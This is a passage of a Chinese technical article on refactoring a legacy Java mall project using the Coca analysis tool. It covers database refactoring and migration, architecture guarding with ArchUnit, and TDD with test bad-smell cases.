&lt;h4&gt;&lt;a id="user-content-高引用--高修改分析" class="anchor" aria-hidden="true" href="#高引用--高修改分析"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;高引用 + 高修改分析&lt;/h4&gt;
&lt;p&gt;执行 &lt;code&gt;coca count&lt;/code&gt; 可以查看高引用的方法：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;REFS COUNT&lt;/th&gt;
&lt;th&gt;METHOD&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;8055&lt;/td&gt;
&lt;td&gt;com.macro.mall.model.GeneratedCriteria.addCriterion&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;199&lt;/td&gt;
&lt;td&gt;com.macro.mall.common.api.CommonResult.success&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;125&lt;/td&gt;
&lt;td&gt;com.macro.mall.common.api.CommonResult.failed&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;td&gt;com.macro.mall.model.GeneratedCriteria.addCriterionForJDBCDate&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;com.macro.mall.common.api.CommonPage.restPage&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;td&gt;com.macro.mall.model.GeneratedCriteria.addCriterionForJDBCTime&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;com.macro.mall.portal.service.UmsMemberService.getCurrentMember&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;com.macro.mall.model.UmsMember.getId&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;com.macro.mall.service.impl.PmsProductServiceImpl.relateAndInsertList&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;com.macro.mall.portal.domain.OrderParam.getUseIntegration&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;com.macro.mall.portal.domain.OrderParam.getCouponId&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;看上去，主要问题还在数据库查询语句拼接那一部分。&lt;/p&gt;
&lt;p&gt;执行 &lt;code&gt;coca git -t&lt;/code&gt; 可以查看经常修改的文件：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ENTITYNAME&lt;/th&gt;
&lt;th&gt;REVSCOUNT&lt;/th&gt;
&lt;th&gt;AUTHORCOUNT&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;README.md&lt;/td&gt;
&lt;td&gt;121&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;document/pdm/mall.pdm&lt;/td&gt;
&lt;td&gt;29&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;document/pdm/mall.pdb&lt;/td&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mall-admin/pom.xml&lt;/td&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mall-portal/pom.xml&lt;/td&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;document/sql/mall.sql&lt;/td&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mall-portal/src/main/java/com/macro/mall/portal/service/impl/OmsPortalOrderServiceImpl.java&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mall-admin/src/main/java/com/macro/mall/controller/PmsBrandController.java&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;document/reference/deploy-windows.md&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mall-search/pom.xml&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;document/docker/docker-deploy.md&lt;/td&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;经常修改的地方是 pom 文件和文档，看上去没啥问题。考虑到 &lt;code&gt;OmsPortalOrderServiceImpl.java&lt;/code&gt; 文件修改了 16 次，我决定打开这个文件看看：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有一个 150 行左右的方法&lt;/li&gt;
&lt;li&gt;总行数 643 行&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;明显这是一个订单相关的上帝类，关联的 OmsOrder 模型有 40 ~ 50 左右的字段。毫无疑问，这里就是代码中经常出现问题的地方。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-测试" class="anchor" aria-hidden="true" href="#测试"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;测试&lt;/h4&gt;
&lt;p&gt;执行了 &lt;code&gt;coca tbs&lt;/code&gt;，一共找到了这几个文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Start parse java call: PmsDaoTests.java
Start parse java call: MallDemoApplicationTests.java
Start parse java call: MallPortalApplicationTests.java
Start parse java call: PortalProductDaoTests.java
Start parse java call: MallSearchApplicationTests.java
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个相当于是没有测试吧。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重构策略" class="anchor" aria-hidden="true" href="#重构策略"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构策略&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;进行 DDD 建模&lt;/li&gt;
&lt;li&gt;搭建 E2E 测试&lt;/li&gt;
&lt;li&gt;引入 Flyway 做数据库迁移&lt;/li&gt;
&lt;li&gt;分层架构重构&lt;/li&gt;
&lt;li&gt;重构到充血模型&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;a id="user-content-架构重构" class="anchor" aria-hidden="true" href="#架构重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;架构重构&lt;/h3&gt;
&lt;p&gt;以下内容暂不免费开放。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-分层重构" class="anchor" aria-hidden="true" href="#分层重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;分层重构&lt;/h3&gt;
&lt;p&gt;以下内容暂不免费开放。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-模型重构-1" class="anchor" aria-hidden="true" href="#模型重构-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;模型重构&lt;/h3&gt;
&lt;p&gt;以下内容暂不免费开放。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-代码重构-1" class="anchor" aria-hidden="true" href="#代码重构-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;代码重构&lt;/h3&gt;
&lt;p&gt;以下内容暂不免费开放。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-自动化重构" class="anchor" aria-hidden="true" href="#自动化重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;自动化重构&lt;/h2&gt;
&lt;p&gt;TBD&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-数据库重构tbc" class="anchor" aria-hidden="true" href="#数据库重构tbc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;数据库重构（TBC）&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;数据库重构，是对数据库 schema 的一个简单变更，在保持其行为语义和信息语义的同时，改进了它的设计。 —— 《数据库重构》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;换言之，你既没有增加新功能，也没有破坏原有的功能，没有添加新的数据，也没有改变原有数据的语义。值得注意的是，尽管你的领域模型发生了变化，但是这也不意味着数据库 schema 需要因此而发生改变；与此同时，一些公司的制度也会限制我们对数据库进行重构。&lt;/p&gt;
&lt;p&gt;它们之间的关系如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/modeling.jpg"&gt;&lt;img src="images/modeling.jpg" alt="Modeling" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如《数据库重构》一书所说：数据库重构是一种数据库实现技术，就像代码重构是一种应用实现技术一样。当我们在不断对代码调优的同时，我们也在不断地对数据库进行调优。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-数据库回归测试数据不变性" class="anchor" aria-hidden="true" href="#数据库回归测试数据不变性"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;数据库回归测试：数据不变性&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-前测试" class="anchor" aria-hidden="true" href="#前测试"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;前测试&lt;/h4&gt;
&lt;p&gt;采用传统的数据库测试工具，如 DBUnit，SQLUnit，通过诸如 TDD 的方式来完成对数据库的测试，随后开展对代码的重构。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-后测试" class="anchor" aria-hidden="true" href="#后测试"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;后测试&lt;/h4&gt;
&lt;p&gt;为了对重构进行验证，我们需要对数据库进行回归测试。一种常见的做法是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;录制行为数据&lt;/li&gt;
&lt;li&gt;通过回复验证功能不被破坏&lt;/li&gt;
&lt;li&gt;通过影子流量进行验证&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这样的工具有很多，如我司吴大师写的 &lt;a href="https://github.com/XuefengWu/dbdiff"&gt;DBdiff&lt;/a&gt;，可以用于 Oracle 数据库的迁移。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-引入数据库迁移工具" class="anchor" aria-hidden="true" href="#引入数据库迁移工具"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;引入数据库迁移工具&lt;/h3&gt;
&lt;p&gt;尽管，我并没有实践过大规模的数据库重构，但是和其他/她的后端开发一样，在日常的开发中，我们也时不时会做一些数据库重构 —— 数据库迁移。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代码版本控制&lt;/li&gt;
&lt;li&gt;数据库版本控制&lt;/li&gt;
&lt;li&gt;多数据识别&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;诸如于 Flyway 和 Liquibase 都是一些不错的工具。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-迁移源数据" class="anchor" aria-hidden="true" href="#迁移源数据"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;迁移源数据&lt;/h3&gt;
&lt;p&gt;我尝试编写脚本来将我的博客 &lt;a href="https://www.phodal.com" rel="nofollow"&gt;https://www.phodal.com&lt;/a&gt; 从 SQLite3 迁移到 MySQL，这并不是一件困难的事情。因为 SQLite3 是一种嵌入式数据库，而我们可以通过 &lt;code&gt;mysqldump&lt;/code&gt; 出 MySQL 的数据。&lt;/p&gt;
&lt;p&gt;如此一来，我们便可以用于做数据库重构练习，并编写数据库的回归测试。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-汲取式重构存储过程转换" class="anchor" aria-hidden="true" href="#汲取式重构存储过程转换"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;汲取式重构：存储过程转换&lt;/h3&gt;
&lt;p&gt;对于采用 Oracle 的项目来说，数据重构不是一件容易的事情。它还涉及到一系列的存储过程代码。&lt;/p&gt;
&lt;p&gt;所以，我们还可以尝试将 PLSQL 转为 Kotlin 代码：&lt;a href="https://github.com/XuefengWu/LADE_Analysis"&gt;https://github.com/XuefengWu/LADE_Analysis&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-重构之后工具的问题" class="anchor" aria-hidden="true" href="#重构之后工具的问题"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构之后：工具的问题&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-架构守护" class="anchor" aria-hidden="true" href="#架构守护"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;架构守护&lt;/h3&gt;
&lt;p&gt;在重构的过程中，我们也可以尝试将它引入到系统中使用。它可以作为我们的架构适应度函数，不断地见证我们架构的变化和成长 —— 以一种肉眼的方式持续演进。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-架构守护测试" class="anchor" aria-hidden="true" href="#架构守护测试"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;架构守护测试&lt;/h4&gt;
&lt;p&gt;ArchUnit 是一个不错的架构守护框架。你可以尝试引入项目的架构中，&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-坏味道守护" class="anchor" aria-hidden="true" href="#坏味道守护"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;坏味道守护&lt;/h4&gt;
&lt;p&gt;我的意思是，只需要集成到持续构建中即可。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-测试驱动开发" class="anchor" aria-hidden="true" href="#测试驱动开发"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;测试驱动开发&lt;/h3&gt;
&lt;p&gt;测试驱动开发适合于解决复杂的问题。&lt;/p&gt;
&lt;p&gt;我并不是一个 TDD 的死忠粉，但是我发现 TDD 非常适合于解决复杂问题。在这个场景下，我有一堆事先准备好的 Test Bad Smell，它们拥有一些对应的检测规则，这些规则相互之间存在一些影响。因此，我将这些 Bad Smell 作为我的测试用例：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AssertionRouletteTest.java
ConditionalTest.java
ConstructorInitializationTest.java
DuplicateAssertTest.java
EmptyTest.java
IgnoreTest.java
MagicNumberTest.java
MysteryGuestTest.java
RedundantAssertionTest.java
&lt;/code&gt;&lt;/pre&gt;
